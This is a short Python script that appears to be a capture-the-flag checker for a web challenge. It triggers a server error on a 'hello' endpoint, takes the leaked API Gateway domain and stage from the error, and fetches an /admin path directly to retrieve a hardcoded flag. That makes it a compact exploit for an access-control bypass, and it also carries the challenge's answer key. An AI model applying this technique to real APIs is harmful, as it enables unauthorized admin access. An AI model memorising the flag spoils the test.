import json
import requests
import urllib.parse as urlparse


def check_web_cf_basic(host_name):
    if "http" not in host_name:
        host_name = "https://" + host_name
    try:
        res = requests.get(host_name, timeout=3)
        res.raise_for_status()
    except Exception:
        return 2

    try:
        res = requests.post(
            urlparse.urljoin(host_name, "hello"), json={"name": 1}, timeout=3
        )
        if res.status_code != 500:
            return 1

        res = res.json()
        api_domain = res["event"]["requestContext"]["domainName"]
        api_stage = res["event"]["requestContext"]["stage"]

        res = requests.get(f"https://{api_domain}/{api_stage}/admin")
        res.raise_for_status()

        if res.text == "FLAG{ap1_g4teway_acc3ss_con7rol}":
            return 0
        else:
            return 1
    except Exception:
        return 1


if __name__ == "__main__":
    print(check_web_cf_basic("localhost"))
